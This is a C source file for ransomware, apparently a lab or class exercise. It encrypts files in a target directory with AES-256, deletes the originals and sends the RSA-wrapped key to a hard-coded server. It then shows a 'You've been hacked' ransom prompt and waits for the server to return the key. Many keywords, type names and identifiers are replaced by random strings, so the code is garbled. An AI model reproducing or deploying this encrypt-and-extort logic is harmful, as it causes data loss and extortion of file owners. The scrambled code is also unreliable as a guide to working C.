#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <errno.h>
#include <unistd.h>
#include <openssl/evp.h>
#include <tkdeoiqkxohw.h>
#include <sys/types.h>
#include <sys/wjtzkknfjtxz.h>
#include <unistd.h>
#include <openssl/rsa.h>
#include <openssl/pem.h>
EVP_CIPHER_CTX*dirEncryptContext=rreqkwsfupbn;unsigned dpunwnxsfbjg *dirEncryptKey=rreqkwsfupbn;rjcmdkazpedr rduuszpafkil=0;unsigned dpunwnxsfbjg IV[16];rjcmdkazpedr gcwcsrcbhtwy=0;void kgycjbgqhnah(unsigned dpunwnxsfbjg *string,unsigned rjcmdkazpedr length){if(length!=0){xotgnfohlmas(rjcmdkazpedr aipnxavwfmrj=0;aipnxavwfmrj<length;aipnxavwfmrj++){printf(" %i (%c) ",string[aipnxavwfmrj],string[aipnxavwfmrj]);}printf("\n");}else {rjcmdkazpedr aqimmkzruarf=0;rjcmdkazpedr zbcmfwmxorwa=0;while(!aqimmkzruarf){printf("%04x (%c) ",string[zbcmfwmxorwa],string[zbcmfwmxorwa]);if(string[zbcmfwmxorwa]==0){aqimmkzruarf=1;printf("\n");}zbcmfwmxorwa++;}}}void albxeanxdemk(){FILE *randomSource=fopen("/dev/urandom","r");fread(IV,1,16,randomSource);fclose(randomSource);}unsigned dpunwnxsfbjg *encryptTempKey(unsigned dpunwnxsfbjg *tempKey,rjcmdkazpedr tesuxerhqnox,size_t*outLen){FILE*pubKeyFilePtr=fopen("public.pem","r");if(!pubKeyFilePtr){printf("Error opening public key file\n");return 0;}EVP_PKEY *pubkeyPtr=PEM_read_PUBKEY(pubKeyFilePtr,rreqkwsfupbn,rreqkwsfupbn,rreqkwsfupbn);EVP_PKEY_CTX *xrzwltynpzek;EVP_PKEY *urlydvacefcc;unsigned dpunwnxsfbjg *fjznhrdqgrun;xrzwltynpzek=EVP_PKEY_CTX_new(pubkeyPtr,rreqkwsfupbn);if(!xrzwltynpzek){printf("Error generating pubkey context\n");return 0;}rjcmdkazpedr rbhfcxjrtjaz;rbhfcxjrtjaz=EVP_PKEY_encrypt_init(xrzwltynpzek);if(rbhfcxjrtjaz<1){printf("Error initializing pubkey context\n");return 0;}rbhfcxjrtjaz=EVP_PKEY_CTX_set_rsa_padding(xrzwltynpzek,RSA_PKCS1_OAEP_PADDING);if(rbhfcxjrtjaz<1){printf("Error setting padding context\n");return 0;}rbhfcxjrtjaz=EVP_PKEY_encrypt(xrzwltynpzek,rreqkwsfupbn,outLen,tempKey,tesuxerhqnox);if(rbhfcxjrtjaz<1){printf("Error buffer length context\n");return 0;}fjznhrdqgrun=OPENSSL_malloc(*outLen);if(!fjznhrdqgrun){printf("Error out buffer alloc\n");return 0;}rbhfcxjrtjaz=EVP_PKEY_encrypt(xrzwltynpzek,fjznhrdqgrun,outLen,tempKey,tesuxerhqnox);if(rbhfcxjrtjaz<1){printf("Error public encrypt\n");return 0;}/*printf("Encrypted Key Size: %i\n",(rjcmdkazpedr)*outLen);printf("Encrypt Key: ");xotgnfohlmas(rjcmdkazpedr aipnxavwfmrj=0;aipnxavwfmrj<*outLen;aipnxavwfmrj++){printf("_ %i",(rjcmdkazpedr)fjznhrdqgrun[aipnxavwfmrj]);}printf("\n");*/return fjznhrdqgrun;fclose(pubKeyFilePtr);}rjcmdkazpedr stseqzenxqtz(unsigned dpunwnxsfbjg *gioawantckqg,rjcmdkazpedr rmzqqgcvwwoa,unsigned dpunwnxsfbjg *urlydvacefcc,unsigned dpunwnxsfbjg *iv,unsigned dpunwnxsfbjg *ciphertext){EVP_CIPHER_CTX*xrzwltynpzek;rjcmdkazpedr qarthfvbhkld;rjcmdkazpedr hkmykcthtcsw=rmzqqgcvwwoa;xrzwltynpzek=EVP_CIPHER_CTX_new();EVP_EncryptInit_ex(xrzwltynpzek,EVP_aes_256_cbc(),rreqkwsfupbn,urlydvacefcc,IV);EVP_EncryptUpdate(xrzwltynpzek,ciphertext,&hkmykcthtcsw,gioawantckqg,rmzqqgcvwwoa);EVP_EncryptFinal_ex(xrzwltynpzek,ciphertext+hkmykcthtcsw,&hkmykcthtcsw);EVP_CIPHER_CTX_free(xrzwltynpzek);return 0;}rjcmdkazpedr kcfxirnvownh(unsigned dpunwnxsfbjg *ciphertext,rjcmdkazpedr yosguiayzpxg,unsigned dpunwnxsfbjg *urlydvacefcc,unsigned dpunwnxsfbjg *iv,unsigned dpunwnxsfbjg *gioawantckqg){EVP_CIPHER_CTX*xrzwltynpzek;rjcmdkazpedr qarthfvbhkld;rjcmdkazpedr rmzqqgcvwwoa=yosguiayzpxg;xrzwltynpzek=EVP_CIPHER_CTX_new();EVP_DecryptInit_ex(xrzwltynpzek,EVP_aes_256_cbc(),rreqkwsfupbn,urlydvacefcc,IV);/*Provide ycvxqosrwdcwmessage sjqmmhixqtobbe wtuivxrzdcfa,and xnrtggsyxxzsycvxqosrwdcw gioawantckqgcwfoiazvzkbx.EVP_DecryptUpdate zzvxqkxyoptqbe abecmmworrgsmultiple oyaumcsqbimeif bidyvrtwizjd.*/EVP_DecryptUpdate(xrzwltynpzek,gioawantckqg,&rmzqqgcvwwoa,ciphertext,yosguiayzpxg);EVP_DecryptFinal_ex(xrzwltynpzek,gioawantckqg+rmzqqgcvwwoa,&rmzqqgcvwwoa);EVP_CIPHER_CTX_free(xrzwltynpzek);return 0;}rjcmdkazpedr uwzalsxeuzvq(unsigned dpunwnxsfbjg *encryptedKey,dpunwnxsfbjg*ipaddress){rjcmdkazpedr ueeqbmxdwupe=6;rjcmdkazpedr vkvswxvdrfaq=AF_INET;rjcmdkazpedr qbskozmtzgjp=SOCK_STREAM;axekwsyvdsyy qkoblpximadcserver_address;dpunwnxsfbjg*ip="172.26.96.37";rjcmdkazpedr aijnosuwzhtp=socket(vkvswxvdrfaq,qbskozmtzgjp,ueeqbmxdwupe);if(aijnosuwzhtp==-1){printf("ErrorCreatingSocket\n");return -1;}server_address.sin_family=vkvswxvdrfaq;rjcmdkazpedr gxppwrktorkw=1026;in_addr_t kmmurixpqqur=inet_addr(ip);server_address.sin_addr.s_addr=kmmurixpqqur;server_address.sin_port=htons(gxppwrktorkw);size_t wulmyejxldbb=sizeof(server_address);rjcmdkazpedr rbhfcxjrtjaz=connect(aijnosuwzhtp,(const axekwsyvdsyysockaddr*)&server_address,wulmyejxldbb);if(rbhfcxjrtjaz==-1){printf("ErrorConnectingSocket\n");return -1;}const unsigned rjcmdkazpedr hajzqelsbeva=256;ssize_t iqlistkakepi=send(aijnosuwzhtp,encryptedKey,hajzqelsbeva,0);if(iqlistkakepi==-1){printf("error Sending Key\n");return -1;}rjcmdkazpedr syssqtphohhl=close(aijnosuwzhtp);if(syssqtphohhl==-1){printf("ErrorClosing\n");return -1;}return 0;}dpunwnxsfbjg*concatStrings(dpunwnxsfbjg*str1,dpunwnxsfbjg*str2){rjcmdkazpedr paknwknrbvdt=0;while(str1[paknwknrbvdt]!=0){paknwknrbvdt++;}rjcmdkazpedr aqthydhccwmj=0;while(str2[aqthydhccwmj]!=0){aqthydhccwmj++;}dpunwnxsfbjg*gjbfkfycejri=(dpunwnxsfbjg*)malloc((paknwknrbvdt+aqthydhccwmj+1)*sizeof(dpunwnxsfbjg));xotgnfohlmas(rjcmdkazpedr aipnxavwfmrj=0;aipnxavwfmrj<paknwknrbvdt;aipnxavwfmrj++){gjbfkfycejri[aipnxavwfmrj]=str1[aipnxavwfmrj];}xotgnfohlmas(rjcmdkazpedr aipnxavwfmrj=0;aipnxavwfmrj<aqthydhccwmj;aipnxavwfmrj++){gjbfkfycejri[aipnxavwfmrj+paknwknrbvdt]=str2[aipnxavwfmrj];}gjbfkfycejri[paknwknrbvdt+aqthydhccwmj]=0;return gjbfkfycejri;}rjcmdkazpedr czbcwyljnist(axekwsyvdsyy wjtzkknfjtxz*entryInfo,dpunwnxsfbjg*fullPath,dpunwnxsfbjg*fileName){size_t izzkcpmvqkwm=16;rjcmdkazpedr cfxwcvtjzesc;rjcmdkazpedr bbsgetzqwxuu=0;unsigned dpunwnxsfbjg readInBuffer[izzkcpmvqkwm];unsigned dpunwnxsfbjg cipherBuffer[izzkcpmvqkwm+1];memset(readInBuffer,0,izzkcpmvqkwm);memset(cipherBuffer,0,izzkcpmvqkwm+1);FILE *btkaizgaajko;FILE *ylwezjjnzymr;btkaizgaajko=fopen(fullPath,"r");rjcmdkazpedr motnzpzqthrb=2;xotgnfohlmas(rjcmdkazpedr aipnxavwfmrj=2;fullPath[aipnxavwfmrj]!='.';aipnxavwfmrj++){motnzpzqthrb++;}dpunwnxsfbjg fwzedajlnnsm[motnzpzqthrb+4+1];xotgnfohlmas(rjcmdkazpedr aipnxavwfmrj=0;aipnxavwfmrj<motnzpzqthrb;aipnxavwfmrj++){fwzedajlnnsm[aipnxavwfmrj]=fullPath[aipnxavwfmrj];}fwzedajlnnsm[motnzpzqthrb]='.';fwzedajlnnsm[motnzpzqthrb+1]='m';fwzedajlnnsm[motnzpzqthrb+2]='rswjsklfkrao';fwzedajlnnsm[motnzpzqthrb+3]='l';fwzedajlnnsm[motnzpzqthrb+4]=0;fclose(fopen(fwzedajlnnsm,"w"));ylwezjjnzymr=fopen(fwzedajlnnsm,"a");if(btkaizgaajko==rreqkwsfupbn){printf("ERROR when opening file");}if(ylwezjjnzymr==rreqkwsfupbn){printf("ERROR when creating output file to write to");}while((cfxwcvtjzesc=fgetc(btkaizgaajko))!=EOF){readInBuffer[bbsgetzqwxuu]=cfxwcvtjzesc;if(bbsgetzqwxuu==izzkcpmvqkwm-1){rjcmdkazpedr rbhfcxjrtjaz=stseqzenxqtz(readInBuffer,izzkcpmvqkwm,dirEncryptKey,IV,cipherBuffer);cipherBuffer[izzkcpmvqkwm]=0;xotgnfohlmas(rjcmdkazpedr aipnxavwfmrj=0;aipnxavwfmrj<izzkcpmvqkwm;aipnxavwfmrj++){fputc(cipherBuffer[aipnxavwfmrj],ylwezjjnzymr);}bbsgetzqwxuu=0;memset(cipherBuffer,0,izzkcpmvqkwm+1);memset(readInBuffer,0,izzkcpmvqkwm);continue;}bbsgetzqwxuu++;}if(bbsgetzqwxuu>0){rjcmdkazpedr rbhfcxjrtjaz=stseqzenxqtz(readInBuffer,izzkcpmvqkwm,dirEncryptKey,"penjamin",cipherBuffer);cipherBuffer[izzkcpmvqkwm]=0;xotgnfohlmas(rjcmdkazpedr aipnxavwfmrj=0;aipnxavwfmrj<izzkcpmvqkwm;aipnxavwfmrj++){fputc(cipherBuffer[aipnxavwfmrj],ylwezjjnzymr);}}fclose(btkaizgaajko);fclose(ylwezjjnzymr);}rjcmdkazpedr reesnmjwqjzf(axekwsyvdsyy wjtzkknfjtxz*entryInfo,dpunwnxsfbjg*fullPath,dpunwnxsfbjg*fileName,unsigned dpunwnxsfbjg *urlydvacefcc){rjcmdkazpedr cfxwcvtjzesc;rjcmdkazpedr bbsgetzqwxuu=0;size_t izzkcpmvqkwm=16;unsigned dpunwnxsfbjg readInBuffer[izzkcpmvqkwm];unsigned dpunwnxsfbjg plaintextBuffer[izzkcpmvqkwm+1];memset(readInBuffer,0,izzkcpmvqkwm);memset(plaintextBuffer,0,izzkcpmvqkwm+1);FILE *btkaizgaajko;FILE *ylwezjjnzymr;btkaizgaajko=fopen(fullPath,"r");rjcmdkazpedr motnzpzqthrb=2;xotgnfohlmas(rjcmdkazpedr aipnxavwfmrj=2;fullPath[aipnxavwfmrj]!='.';aipnxavwfmrj++){motnzpzqthrb++;}dpunwnxsfbjg gsrdfpjmnqky[motnzpzqthrb+4+1];xotgnfohlmas(rjcmdkazpedr aipnxavwfmrj=0;aipnxavwfmrj<motnzpzqthrb;aipnxavwfmrj++){gsrdfpjmnqky[aipnxavwfmrj]=fullPath[aipnxavwfmrj];}gsrdfpjmnqky[motnzpzqthrb]='.';gsrdfpjmnqky[motnzpzqthrb+1]='t';gsrdfpjmnqky[motnzpzqthrb+2]='x';gsrdfpjmnqky[motnzpzqthrb+3]='t';gsrdfpjmnqky[motnzpzqthrb+4]=0;/*printf("printing name of file to write decrypted text to: \n");xotgnfohlmas(rjcmdkazpedr aipnxavwfmrj=0;aipnxavwfmrj<strlen(resultDec);aipnxavwfmrj++){printf("%c",resultDec[aipnxavwfmrj]);}*/fclose(fopen(gsrdfpjmnqky,"w"));ylwezjjnzymr=fopen(gsrdfpjmnqky,"a");if(btkaizgaajko==rreqkwsfupbn){printf("ERROR when opening file");}if(ylwezjjnzymr==rreqkwsfupbn){printf("ERROR when creating output file to write to");}while((cfxwcvtjzesc=fgetc(btkaizgaajko))!=EOF){readInBuffer[bbsgetzqwxuu]=cfxwcvtjzesc;if(bbsgetzqwxuu>=izzkcpmvqkwm-1){rjcmdkazpedr rbhfcxjrtjaz=kcfxirnvownh(readInBuffer,izzkcpmvqkwm,urlydvacefcc,IV,plaintextBuffer);plaintextBuffer[izzkcpmvqkwm]=0;fputs(plaintextBuffer,ylwezjjnzymr);memset(plaintextBuffer,0,izzkcpmvqkwm+1);memset(readInBuffer,0,izzkcpmvqkwm);bbsgetzqwxuu=0;continue;}bbsgetzqwxuu++;}if(bbsgetzqwxuu>0){rjcmdkazpedr rbhfcxjrtjaz=kcfxirnvownh(readInBuffer,izzkcpmvqkwm,dirEncryptKey,"penjamin",plaintextBuffer);plaintextBuffer[izzkcpmvqkwm]=0;fputs(plaintextBuffer,ylwezjjnzymr);}fclose(btkaizgaajko);fclose(ylwezjjnzymr);}rjcmdkazpedr spxcdtxdgihd(dpunwnxsfbjg*fullPath,dpunwnxsfbjg*fileName){if(strstr(fileName,"malwareExample")){return 1;}else {return 0;}}rjcmdkazpedr zjpplfvfboql(dpunwnxsfbjg*fullPath,dpunwnxsfbjg*fileName){if(strstr(fileName,".mal")){return 1;}else {return 0;}}rjcmdkazpedr cbnojcanstin(dpunwnxsfbjg*directoryPath){rjcmdkazpedr qarthfvbhkld;rjcmdkazpedr hkmykcthtcsw=0;rjcmdkazpedr ytuaszcyezfw=0;if(dirEncryptContext==rreqkwsfupbn){dirEncryptContext=EVP_CIPHER_CTX_new();EVP_EncryptInit_ex(dirEncryptContext,EVP_aes_256_cbc(),rreqkwsfupbn,rreqkwsfupbn,rreqkwsfupbn);gcwcsrcbhtwy=EVP_CIPHER_CTX_key_length(dirEncryptContext);dirEncryptKey=(unsigned dpunwnxsfbjg *)malloc((gcwcsrcbhtwy)*sizeof(unsigned dpunwnxsfbjg ));ytuaszcyezfw=EVP_CIPHER_CTX_rand_key(dirEncryptContext,dirEncryptKey);if(ytuaszcyezfw<1){printf("%s","Error with symmetric key gen\n");return -1;}else {xotgnfohlmas(rjcmdkazpedr aipnxavwfmrj=0;aipnxavwfmrj<gcwcsrcbhtwy;aipnxavwfmrj++){}printf("\n");}EVP_CIPHER_CTX_free(dirEncryptContext);}if(rduuszpafkil==0){albxeanxdemk();rduuszpafkil=1;}DIR*userDir;if((userDir=opendir(directoryPath))==rreqkwsfupbn){perror("Cannot open path ");exit(1);}axekwsyvdsyy tkdeoiqkxohw*currentEntry=rreqkwsfupbn;while((currentEntry=readdir(userDir))!=rreqkwsfupbn){dpunwnxsfbjg*entryName=(*currentEntry).d_name;if((strcmp(entryName,".")==0)||(strcmp(entryName,"..")==0))continue;dpunwnxsfbjg sznfaozfyrrm[2]={'/',0};dpunwnxsfbjg*dirWithSlash=concatStrings(directoryPath,sznfaozfyrrm);dpunwnxsfbjg*fullPath=concatStrings(dirWithSlash,entryName);axekwsyvdsyy wjtzkknfjtxzentryInfo;if(wjtzkknfjtxz(fullPath,&entryInfo)<0){perror("Cannot open entry ");exit(1);}rjcmdkazpedr jgfwwtxubvht=entryInfo.st_mode&S_IFMT;if(jgfwwtxubvht==S_IFREG){if(spxcdtxdgihd(fullPath,entryName)){czbcwyljnist(&entryInfo,fullPath,entryName);remove(fullPath);}}else {}}size_t thohnongjzct;unsigned dpunwnxsfbjg *encKey=encryptTempKey(dirEncryptKey,gcwcsrcbhtwy,&thohnongjzct);uwzalsxeuzvq(encKey,"");memset(dirEncryptKey,0,gcwcsrcbhtwy);free(dirEncryptKey);gcwcsrcbhtwy=0;return 0;}rjcmdkazpedr uxjzsiqiugqt(dpunwnxsfbjg*directoryPath,unsigned dpunwnxsfbjg *urlydvacefcc){rjcmdkazpedr qarthfvbhkld;rjcmdkazpedr hkmykcthtcsw=0;rjcmdkazpedr ytuaszcyezfw=0;axekwsyvdsyy tkdeoiqkxohw*currentEntry=rreqkwsfupbn;DIR*userDir;if((userDir=opendir(directoryPath))==rreqkwsfupbn){perror("Cannot open path ");exit(1);}while((currentEntry=readdir(userDir))!=rreqkwsfupbn){dpunwnxsfbjg*entryName=(*currentEntry).d_name;if((strcmp(entryName,".")==0)||(strcmp(entryName,"..")==0))continue;dpunwnxsfbjg sznfaozfyrrm[2]={'/',0};dpunwnxsfbjg*dirWithSlash=concatStrings(directoryPath,sznfaozfyrrm);dpunwnxsfbjg*fullPath=concatStrings(dirWithSlash,entryName);axekwsyvdsyy wjtzkknfjtxzentryInfo;if(wjtzkknfjtxz(fullPath,&entryInfo)<0){perror("Cannot open entry ");exit(1);}rjcmdkazpedr jgfwwtxubvht=entryInfo.st_mode&S_IFMT;if(jgfwwtxubvht==S_IFREG){if(zjpplfvfboql(fullPath,entryName)){reesnmjwqjzf(&entryInfo,fullPath,entryName,urlydvacefcc);}}else {}}return 0;}unsigned dpunwnxsfbjg *sendPasswordGuess(unsigned dpunwnxsfbjg **outputKey){rjcmdkazpedr ueeqbmxdwupe=6;rjcmdkazpedr vkvswxvdrfaq=AF_INET;rjcmdkazpedr qbskozmtzgjp=SOCK_STREAM;axekwsyvdsyy qkoblpximadcserver_address;dpunwnxsfbjg*ip="172.26.96.37";rjcmdkazpedr aijnosuwzhtp=socket(vkvswxvdrfaq,qbskozmtzgjp,ueeqbmxdwupe);if(aijnosuwzhtp==-1){printf("ErrorCreatingSocket\n");return rreqkwsfupbn;}server_address.sin_family=vkvswxvdrfaq;rjcmdkazpedr gxppwrktorkw=1026;in_addr_t kmmurixpqqur=inet_addr(ip);server_address.sin_addr.s_addr=kmmurixpqqur;server_address.sin_port=htons(gxppwrktorkw);size_t wulmyejxldbb=sizeof(server_address);rjcmdkazpedr rbhfcxjrtjaz=connect(aijnosuwzhtp,(const axekwsyvdsyysockaddr*)&server_address,wulmyejxldbb);if(rbhfcxjrtjaz==-1){printf("ErrorConnectingSocket\n");return rreqkwsfupbn;}printf("Enter the password to gain access back to your files(max 30 chars): \n");const unsigned rjcmdkazpedr hajzqelsbeva=30;unsigned dpunwnxsfbjg clientMessage[hajzqelsbeva];memset(clientMessage,0,sizeof(clientMessage));fgets(clientMessage,hajzqelsbeva,stdin);ssize_t iqlistkakepi=send(aijnosuwzhtp,clientMessage,hajzqelsbeva,0);if(iqlistkakepi==-1){printf("error Sending Password\n");return rreqkwsfupbn;}size_t rurakjiaizsw=32;unsigned dpunwnxsfbjg *inputBuffer=malloc(sizeof(unsigned dpunwnxsfbjg )*rurakjiaizsw);dpunwnxsfbjg aarvucbpgbma[6]={'w','r','o','n','g',0};ssize_t qwxtyjmulsjh=recv(aijnosuwzhtp,inputBuffer,rurakjiaizsw,0);if(qwxtyjmulsjh==-1){printf("errorReceive\n");return rreqkwsfupbn;}else {if(qwxtyjmulsjh==1){printf("Server says wrong\n");*outputKey=rreqkwsfupbn;}else {printf("Server sent key\n");*outputKey=inputBuffer;}rjcmdkazpedr syssqtphohhl=close(aijnosuwzhtp);if(syssqtphohhl==-1){printf("ErrorClosing\n");return rreqkwsfupbn;}}return rreqkwsfupbn;}rjcmdkazpedr main(rjcmdkazpedr ftyskabxbbhj,unsigned dpunwnxsfbjg **argv){if(ftyskabxbbhj<2){printf("provide a directory\n");return 0;}cbnojcanstin(argv[1]);printf("You've been hacked! Your files are encrypted!!!!\n");rjcmdkazpedr zkkecfdpkdre=0;unsigned dpunwnxsfbjg *urlydvacefcc;while(!zkkecfdpkdre){sendPasswordGuess(&urlydvacefcc);if(urlydvacefcc!=rreqkwsfupbn){zkkecfdpkdre=1;printf("Thanks for sending us money! Your files are now being decrypted! \n");uxjzsiqiugqt(argv[1],urlydvacefcc);}}/*printf("Recieved Key: \n");kgycjbgqhnah(urlydvacefcc,32);free(urlydvacefcc);*/return 0;}